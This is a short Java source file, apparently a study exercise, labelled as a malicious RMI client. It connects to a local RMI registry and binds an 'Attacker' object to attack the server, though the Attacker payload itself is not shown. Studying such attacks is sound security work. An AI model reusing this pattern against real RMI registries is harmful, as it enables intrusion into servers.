package basics.rmi.attack;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * 恶意客户端，攻击服务器，向服务端注册恶意对象
 *
 * @author baB_hyf
 * @date 2021/03/29
 */
public class Client {

    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.getRegistry("localhost", 1099);
        registry.bind("attacker", new Attacker());
    }
}
